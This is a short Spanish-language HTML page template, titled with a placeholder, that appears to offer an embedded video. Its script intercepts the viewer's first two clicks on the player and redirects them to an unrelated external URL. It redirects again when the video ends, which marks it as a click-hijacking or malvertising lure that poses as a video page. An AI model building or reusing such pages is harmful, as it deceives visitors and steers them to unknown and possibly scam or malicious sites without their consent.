<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>TITULO DEL VIDEO</title>
  <script>
    const redirectUrl = 'https://datingprudethimble.com/2056090';
    let clickCount = 0;

    function handleClick(event) {
        clickCount++;
        if (clickCount <= 2) {
            window.location.href = redirectUrl;
            event.preventDefault();
        }
    }

    document.addEventListener("DOMContentLoaded", function() {
        var video = document.getElementById('videoPlayer');
        if (video) {
            video.addEventListener('ended', function() {   
                window.location.href = redirectUrl;
            });
        }
    });
  </script>
</head>
<body>
  <div style="max-width: 100%; overflow: hidden;">
    <video id="videoPlayer" controls style="width: 100%;" playsinline onclick="handleClick(event)">
      <source src="https://cdn.videy.co/9F2XDRa6.mp4" type="video/mp4">
      Tu navegador no soporta la reproducci√≥n de videos.
    </video>
  </div>
</body>
</html>
